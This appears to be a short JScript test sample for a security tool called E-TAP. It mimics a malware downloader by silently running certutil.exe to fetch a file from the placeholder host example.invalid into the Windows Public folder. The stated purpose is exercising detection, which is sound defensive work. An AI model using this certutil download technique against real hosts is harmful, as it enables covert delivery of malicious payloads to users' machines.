// E-TAP demo sample -- harmless. Mimics a downloader technique; fails DNS.
var sh = new ActiveXObject("WScript.Shell");
sh.Run("certutil.exe -urlcache -split -f http://example.invalid/etap-demo.txt C:\\Users\\Public\\etap-demo.txt", 0, true);
